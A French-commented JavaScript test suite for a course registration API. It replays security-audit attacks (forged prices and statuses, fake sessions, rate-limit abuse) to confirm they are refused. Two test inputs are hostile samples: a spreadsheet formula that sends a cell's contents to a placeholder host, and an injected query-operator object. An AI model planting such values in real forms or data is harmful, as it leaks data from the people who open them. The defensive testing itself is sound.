/* Une inscription publique : ce qui est accepté, recalculé, refusé.
 *
 * Le formulaire est ouvert à tous : n'importe qui peut appeler l'API sans
 * passer par le site. Chaque attaque de l'audit du 2 octobre 2026 est rejouée
 * ici contre le vrai code (api/_lib/inscription.js), sur une base PGlite qui
 * contient le catalogue réel. Chaque refus a son contre-contrôle. */
'use strict';

const fs = require('fs');
const path = require('path');
const { baseNeuve, verificateur } = require('./outils');
const { catalogueVersSql } = require('../import-catalogue');
const {
  recevoirInscription, empreinte, INSCRIPTIONS_PAR_JOUR, ALERTES_PAR_JOUR, PAR_CONNEXION_PAR_HEURE
} = require('../../../api/_lib/inscription');

const { verifier, bilan } = verificateur();
const source = JSON.parse(fs.readFileSync(path.join(__dirname, 'catalogue-2026-10-02.json'), 'utf8'));

/** Ce que le formulaire du site envoie vraiment, pour Canva Pro aux Comores. */
const VALABLE = {
  formationId: 'canva-pro', sessionId: 'canva-pro-2026-11', nom: 'SAID', prenom: 'Awa',
  telephone: '3212345', email: 'awa@exemple.test', age: 24, profession: 'Étudiant',
  niveau: 'Débutant', motivation: 'Créer mes visuels', modePaiement: 'Mvola', telPaiement: '3212345',
  statut: 'En attente', source: 'Site', paysCode: 'KM', pays: 'Comores', countryCode: '+269',
  telephoneInternational: '+2693212345', montant: 15000, currency: 'KMF',
  formationTitle: 'Canva Pro & Création de contenu', dateInscription: '2026-10-03T08:00:00.000Z'
};
let numero = 3000000;
/** Une inscription valable, avec un téléphone neuf à chaque appel (pas de doublon involontaire). */
const neuve = (autres = {}) => Object.assign({}, VALABLE, { telephone: String(numero++) }, autres);

(async () => {
  const db = await baseNeuve();
  await db.exec(catalogueVersSql(source).sql);
  const recevoir = (charge, ip = '41.223.0.10') => recevoirInscription(db, charge, { ip, sel: 'sel-des-epreuves' });
  const derniere = async () => (await db.query('select * from inscriptions order by recue_le desc, id limit 1')).rows[0];
  const compter = async () => (await db.query('select count(*)::int as n from inscriptions')).rows[0].n;

  // ------------------------------------------------ 1. Le cas ordinaire ---

  const premiere = await recevoir(VALABLE);
  verifier('une inscription ordinaire est acceptée', premiere.resultat, { ok: true });
  verifier('et l’alerte est due', premiere.alerter, true);
  const l = await derniere();
  verifier('elle arrive « En attente »', l.statut, 'En attente');
  verifier('titre pris dans le catalogue', l.formation_title, 'Canva Pro & Création de contenu');
  verifier('date de session en français, calculée', l.session_label, '10 octobre 2026');
  verifier('tarif du pays pour cette session', [l.montant, l.devise], [15000, 'KMF']);
  verifier('numéro international recomposé', l.telephone_international, '+2693212345');
  verifier('pays du catalogue', [l.pays, l.pays_code], ['Comores', 'KM']);
  verifier('la requête brute est conservée à part', l.charge.formationId, 'canva-pro');

  // ------------------------------- 2. Ce que le navigateur ne décide plus ---

  /* Audit S1 et S8 : statut, montant, devise, titre et date forgés. */
  await recevoir(neuve({
    statut: 'Payé', montant: 1, currency: 'EUR', formationTitle: 'Formation offerte',
    sessionLabel: '1er janvier 2020', telephoneInternational: '+33600000000'
  }));
  const forgee = await derniere();
  verifier('statut forgé ignoré', forgee.statut, 'En attente');
  verifier('montant forgé ignoré', forgee.montant, 15000);
  verifier('devise forgée ignorée', forgee.devise, 'KMF');
  verifier('titre forgé ignoré', forgee.formation_title, 'Canva Pro & Création de contenu');
  verifier('date forgée ignorée', forgee.session_label, '10 octobre 2026');
  verifier('indicatif forgé ignoré', forgee.telephone_international.startsWith('+269'), true);

  // ------------------------------------------------- 3. Le minimum exigé ---

  const avant = await compter();
  verifier('sans nom : refusée', (await recevoir(neuve({ nom: '', prenom: '' }))).resultat.erreur, 'Le nom est obligatoire.');
  verifier('un prénom seul suffit', (await recevoir(neuve({ nom: '' }))).resultat.ok, true);
  verifier('téléphone trop court : refusée', (await recevoir(neuve({ telephone: '123' }))).resultat.ok, false);
  verifier('sans formation : refusée', (await recevoir(neuve({ formationId: '' }))).resultat.ok, false);
  /* Audit S6 : une liste glissée dans un champ (un nom en « =IMAGE(…) » par exemple). */
  verifier('une liste dans un champ : refusée', (await recevoir(neuve({ nom: ['=IMAGE("https://x/?"&A1)'] }))).resultat.erreur,
    'Un champ du formulaire est illisible.');
  verifier('un objet dans un champ : refusé', (await recevoir(neuve({ age: { $gt: 1 } }))).resultat.ok, false);
  verifier('les refus n’ont rien écrit (seul le prénom seul est entré)', await compter(), avant + 1);

  /* Ce qui dépasse est tronqué, pas rejeté : une inscription perdue coûte plus cher. */
  await recevoir(neuve({ nom: 'A'.repeat(5000), motivation: 'B'.repeat(9000) }));
  const longue = await derniere();
  verifier('un champ ordinaire est ramené à 300 caractères', longue.nom.length, 300);
  verifier('un champ libre garde 2000 caractères', longue.motivation.length, 2000);

  // ----------------------------------------------- 4. Ce qui n'existe pas ---

  verifier('formation inventée : refusée', (await recevoir(neuve({ formationId: 'fantome' }))).resultat.erreur, 'Cette formation n’existe pas.');
  verifier('session inventée : refusée', (await recevoir(neuve({ sessionId: 'fantome-2026' }))).resultat.erreur, 'Cette session n’existe pas.');
  verifier('session d’une autre formation : refusée',
    (await recevoir(neuve({ sessionId: 'marketing-digital-2026-11' }))).resultat.erreur, 'Cette session n’appartient pas à cette formation.');
  /* Djibouti est fermé dans le catalogue réel. */
  verifier('pays fermé : refusé', (await recevoir(neuve({ paysCode: 'DJ' }))).resultat.erreur, 'Ce pays n’est pas desservi pour le moment.');
  verifier('pays inventé : refusé', (await recevoir(neuve({ paysCode: 'XX' }))).resultat.ok, false);

  /* Une session proposée aux seules Comores ne s'achète pas depuis Djibouti, même rouvert. */
  await db.exec(`update pays set active = true where code = 'DJ'`);
  verifier('session d’un autre pays : refusée',
    (await recevoir(neuve({ paysCode: 'DJ' }))).resultat.erreur, 'Cette session n’est pas proposée dans votre pays.');
  await db.exec(`update pays set active = false where code = 'DJ'`);

  /* Une session fermée ne prend plus d'inscription, même en appelant l'API directement. */
  await db.exec(`update sessions set registration_open = false where id = 'canva-pro-2026-11'`);
  verifier('session fermée : refusée', (await recevoir(neuve())).resultat.erreur, 'Les inscriptions sont fermées pour cette session.');
  await db.exec(`update sessions set registration_open = true where id = 'canva-pro-2026-11'`);
  verifier('rouverte, elle accepte de nouveau', (await recevoir(neuve())).resultat.ok, true);

  /* Sans session : seulement si la formation l'accepte (la règle même du site). Canva Pro l'accepte. */
  verifier('sans session, pour une formation qui l’accepte : acceptée', (await recevoir(neuve({ sessionId: '' }))).resultat.ok, true);
  const sansSession = await derniere();
  verifier('et son tarif est celui de la formation', [sansSession.session_id, sansSession.montant], [null, 15000]);
  await db.exec(`update formations set allow_registration_without_session = false where form_id = 'canva-pro'`);
  verifier('pour une formation qui ne l’accepte pas : refusée',
    (await recevoir(neuve({ sessionId: '' }))).resultat.erreur, 'Choisissez une session pour vous inscrire.');
  await db.exec(`update formations set allow_registration_without_session = true where form_id = 'canva-pro'`);

  // ------------------------------------------- 5. Les doublons et le volume ---

  /* Le même candidat renvoie après un délai dépassé : « reçu », sans doublon. */
  const n = await compter();
  const deux = await recevoir(VALABLE);
  verifier('un renvoi dans les 24 h répond « reçu »', deux.resultat, { ok: true });
  verifier('sans écrire de doublon', await compter(), n);
  verifier('ni redemander d’alerte', deux.alerter, false);
  verifier('le même téléphone pour une AUTRE formation est accepté',
    (await recevoir(Object.assign({}, VALABLE, { formationId: 'marketing-digital', sessionId: 'marketing-digital-2026-11' }))).resultat.ok, true);

  /* L'adresse n'est jamais gardée en clair. */
  const empreinteRangee = (await derniere()).empreinte_ip;
  verifier('l’adresse est gardée en empreinte, pas en clair', [empreinteRangee.length, empreinteRangee.includes('41.223')], [32, false]);
  verifier('et cette empreinte dépend du sel secret', empreinte('41.223.0.10', 'autre-sel') !== empreinteRangee, true);

  /* Une même connexion est bornée — largement, car beaucoup de téléphones partagent l'adresse de l'opérateur. */
  const ip = '196.0.0.77';
  let acceptees = 0;
  for (let i = 0; i < PAR_CONNEXION_PAR_HEURE + 3; i++) if ((await recevoir(neuve(), ip)).resultat.ok) acceptees++;
  verifier(`une même connexion : ${PAR_CONNEXION_PAR_HEURE} par heure, pas plus`, acceptees, PAR_CONNEXION_PAR_HEURE);
  verifier('une autre connexion passe toujours', (await recevoir(neuve(), '196.0.0.78')).resultat.ok, true);

  /* Le plafond du jour : on remplit la journée jusqu'à sa limite. */
  const dejaAujourdhui = await compter();
  await db.query(`insert into inscriptions (form_id, nom, recue_le)
    select 'canva-pro', 'Remplissage ' || g, now() from generate_series(1, $1) g`, [INSCRIPTIONS_PAR_JOUR - dejaAujourdhui]);
  const auPlafond = await recevoir(neuve(), '10.0.0.1');
  verifier('au plafond du jour : refusée', auPlafond.resultat.ok, false);
  verifier('avec un message qui renvoie vers l’e-mail', /infos@impactali\.site/.test(auPlafond.resultat.erreur), true);
  verifier('rien n’a été écrit au-delà', await compter(), INSCRIPTIONS_PAR_JOUR);

  /* Les alertes : seulement les 60 premières de la journée (quota de Resend). */
  await db.exec(`delete from inscriptions`);
  const alertes = [];
  for (let i = 0; i < ALERTES_PAR_JOUR + 2; i++) alertes.push((await recevoir(neuve(), '10.0.' + i + '.1')).alerter);
  verifier(`les ${ALERTES_PAR_JOUR} premières demandent une alerte`, alertes.slice(0, ALERTES_PAR_JOUR).every(Boolean), true);
  verifier('les suivantes, non', alertes.slice(ALERTES_PAR_JOUR), [false, false]);

  await db.close();
  bilan();
})().catch(e => { console.error(e); process.exitCode = 1; });
